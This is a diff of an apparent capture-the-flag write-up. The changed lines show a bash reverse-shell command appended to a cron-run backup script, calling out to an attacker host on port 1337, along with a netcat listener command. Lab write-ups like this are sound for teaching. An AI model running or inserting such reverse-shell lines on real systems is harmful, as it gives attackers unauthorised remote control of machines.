@@ -309,7 +309,7 @@ It seems like this bash script runs with a CRON.
 In the main_backup.sh script, I add a reverse shell script:
 
 ```
-/bin/bash -i >& /dev/tcp/10.9.1.194/1337 0>&1
+/bin/bash -i >& /dev/tcp/MY-IP/1337 0>&1
 ```
 
 And set up a listener on my machine `nc -lnvp 1337`.
